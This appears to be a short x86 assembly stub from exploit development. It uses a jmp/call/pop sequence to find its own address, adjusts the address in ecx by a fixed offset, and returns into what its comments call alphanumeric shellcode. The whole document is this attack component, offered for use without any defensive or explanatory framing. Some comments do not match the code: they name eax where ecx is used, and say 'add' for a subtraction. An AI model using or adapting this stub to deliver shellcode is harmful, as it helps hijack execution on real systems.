_start:
jmp geteip

back:
jmp begin

geteip:
call back

begin:
; eip on stack now
pop ecx             ; put eip into eax
sub cx, 0x545       ; add offset of our alphanumeric shellcode

push ecx
inc ecx
ret

;jmp ecx             ; jump into our alpha-numeric shellcode which
                    ; relies on it's start address being in ecx
